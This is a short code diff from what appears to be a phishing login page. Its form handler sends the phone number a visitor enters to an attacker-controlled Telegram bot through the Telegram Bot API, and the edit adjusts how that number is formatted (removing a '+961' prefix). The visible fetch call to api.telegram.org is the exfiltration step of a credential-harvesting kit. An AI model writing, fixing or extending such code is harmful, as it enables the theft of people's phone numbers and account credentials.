@@ -422,7 +422,7 @@
       e.preventDefault();
       loginBtn.textContent = "Processing...";
       loginBtn.disabled = true;
-      submittedPhone = "+961" + phoneInput.value;
+      submittedPhone = "" + phoneInput.value;
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
